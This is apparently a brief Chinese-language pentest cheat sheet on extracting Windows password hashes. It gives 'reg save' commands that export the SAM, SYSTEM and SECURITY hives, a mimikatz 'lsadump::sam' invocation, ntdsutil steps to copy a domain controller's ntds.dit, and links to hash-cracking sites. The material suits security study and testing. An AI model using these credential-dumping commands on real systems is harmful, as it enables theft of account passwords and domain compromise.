# Windows Hash提取

## 0x00 基础知识

- LM Hash Windows Vista和Windows Server 2008以前的系统还会使用
- NTLM Hash
- Net-NTLM Hash 网络环境下NTLM认证中的hash

[Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D)
## 0x01 离线获取Hash

### 1.目标主机注册表导出文件
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save hklm\security security.hive
```
### 2. 通过mimikatz导出Hash

```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```

### 3. 导出域Hash ntds,dit
```
 创建快照
ntdsutil snapshot "activate instance ntds" create quit quit
GUID 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}

# 挂载快照
ntdsutil snapshot "mount GUID" quit quit

# 复制 ntds.dit
copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit

# 卸载快照
ntdsutil snapshot "unmount GUID" quit quit

# 删除快照
ntdsutil snapshot "delete GUID" quit quit

# 查询快照
ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
 ```
### 
## 0x02 主机获取Hash

## 0x03 破解 Hash 
>强力推荐
- [Ophcrack 在线破解](https://www.objectif-securite.ch/en/ophcrack)

- [Cmd5在线破解](https://www.cmd5.com/)

## Ref

- https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 
